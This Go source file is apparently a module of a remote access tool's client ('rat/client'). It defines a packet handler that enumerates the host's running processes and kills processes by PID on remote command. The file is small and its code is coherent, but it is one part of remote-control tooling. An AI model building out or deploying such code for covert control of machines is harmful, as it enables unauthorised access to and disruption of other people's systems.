package main

import (
	"rat/client/network/header"
	"rat/client/process"
	"rat/client/processes"

	"gopkg.in/mgo.v2/bson"
)

type Process struct {
	Path string "path"
	PID  int    "pid"
}

type ProcessPacket struct {
	Action    int       "action"
	Processes []Process "processes"
}

func (packet ProcessPacket) Header() header.PacketHeader {
	return header.ProcessHeader
}

func (packet *ProcessPacket) Init() {
	process.QueryProcesses()

	for _, proc := range process.Processes {
		packet.Processes = append(packet.Processes, Process{
			PID:  proc.PID,
			Path: proc.Path,
		})
	}
}

func (packet ProcessPacket) OnReceive() error {
	t := packet.Action

	for _, proc := range packet.Processes {
		if t == processes.Kill {
			process.Kill(proc.PID)
		}
	}

	switch t {
	case processes.Query:
		Queue <- &ProcessPacket{}
	default:
		// error
	}

	return nil
}

func (packet ProcessPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
